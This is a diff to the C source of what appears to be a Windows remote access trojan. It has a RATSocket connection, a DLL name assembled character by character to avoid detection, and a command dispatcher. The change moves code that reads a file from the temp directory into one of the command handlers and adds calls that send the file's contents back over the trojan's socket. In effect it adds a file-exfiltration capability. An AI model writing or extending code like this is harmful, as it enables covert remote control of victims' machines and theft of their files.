@@ -68,37 +68,6 @@ WinMain(HINSTANCE hInstance,
 		LPSTR lpCmdLine,
 		int nCmdShow)
 {
-	char filePath[MAX_PATH];
-	GetTempPathA(MAX_PATH, filePath);
-	strncat_s(filePath, "test.txt", 8);
-
-	FILE* fs;
-	errno_t errorNo = fopen_s(&fs, filePath, "rb");
-	if ( errorNo == 0 )
-	{
-		while( !feof(fs) )
-		{
-			char readBuffer[SOCKET_BUFFER_SIZE] = {};
-			size_t readSize = fread(&readBuffer, 1, SOCKET_BUFFER_SIZE, fs);
-			if ( readSize > 0 )
-			{
-				OutputDebugStringA(readBuffer);
-				OutputDebugStringA("\n");
-			}
-			else
-			{
-				break;
-			}
-		}
-	}
-	else
-	{
-		OutputDebugString("[ERROR] Error opening file.\n");
-	}
-	fclose(fs);
-	
-	return 0;
-	
 	RATSocket ratSocket = {};
 	
 	char ca_ws2_32[] = {'W','s','2','_','3','2','.','d','l','l', 0};
@@ -294,6 +263,36 @@ WinMain(HINSTANCE hInstance,
 
 			CloseHandle(pi.hProcess);
 			CloseHandle(pi.hThread);
+
+			char filePath[MAX_PATH];
+			GetTempPathA(MAX_PATH, filePath);
+			strncat_s(filePath, "test.txt", 8);
+
+			FILE* fs;
+			errno_t errorNo = fopen_s(&fs, filePath, "rb");
+			if ( errorNo == 0 )
+			{
+				while( !feof(fs) )
+				{
+					char readBuffer[SOCKET_BUFFER_SIZE] = {};
+					size_t readSize = fread(&readBuffer, 1, SOCKET_BUFFER_SIZE, fs);
+					if ( readSize > 0 )
+					{
+						SocketSend(&ratSocket, readBuffer);
+						OutputDebugStringA(readBuffer);
+						OutputDebugStringA("\n");
+					}
+				}
+				SocketSend(&ratSocket, "DONE");
+				OutputDebugString("DONE");
+			}
+			else
+			{
+				OutputDebugString("[ERROR] Error opening file.\n");
+			}
+			fclose(fs);
+	
+			return 0;
 		}
 		else if ( strcmp(splittedCommand[0], ca_shutdown) == 0 )
 		{
